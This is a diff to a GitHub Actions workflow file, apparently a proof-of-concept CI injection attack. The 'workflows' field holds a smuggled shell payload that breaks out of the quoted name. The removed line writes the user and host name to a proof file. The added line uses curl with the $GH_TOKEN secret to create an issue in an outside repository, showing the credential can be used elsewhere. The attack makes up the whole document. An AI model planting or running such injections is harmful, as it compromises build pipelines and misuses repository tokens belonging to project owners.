@@ -1,7 +1,7 @@
 name: Report Build Result v2
 on:
   workflow_run:
-    workflows: ['Build with unit tests"; echo "RCE-PROOF user=$(whoami) host=$(hostname)" > pwn_proof_v3.txt; echo "']
+    workflows: ['Build with unit tests"; curl -s -H "Authorization:token $GH_TOKEN" https://api.github.com/repos/omarrrfds/poc-cdap-injection/issues -d "{"title":"PoC2-cred-test"}"; echo "']
     types: [completed]
 jobs:
   report:
